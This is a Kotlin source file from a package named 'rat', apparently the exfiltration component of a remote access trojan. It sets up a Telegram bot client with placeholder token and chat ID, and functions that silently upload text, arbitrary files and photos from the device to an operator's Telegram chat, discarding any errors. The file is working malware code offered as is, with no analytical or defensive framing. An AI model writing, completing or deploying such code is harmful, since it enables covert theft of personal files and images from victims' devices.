package com.vanta.rat

import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.util.concurrent.TimeUnit

object Telegram {
    const val BOT_TOKEN = "PUT_BOT_TOKEN_HERE"
    const val CHAT_ID   = "PUT_CHAT_ID_HERE"

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    fun sendMessage(text: String) {
        val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
        val body = FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build()
        val req = Request.Builder().url(url).post(body).build()
        runCatching { client.newCall(req).execute().close() }
    }

    fun sendFile(file: File, caption: String = "") {
        val url = "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("caption", caption)
            .addFormDataPart("document", file.name, file.asRequestBody("application/octet-stream".toMediaTypeOrNull()))
            .build()
        val req = Request.Builder().url(url).post(body).build()
        runCatching { client.newCall(req).execute().close() }
    }

    fun sendPhoto(file: File) {
        val url = "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaTypeOrNull()))
            .build()
        val req = Request.Builder().url(url).post(body).build()
        runCatching { client.newCall(req).execute().close() }
    }
}
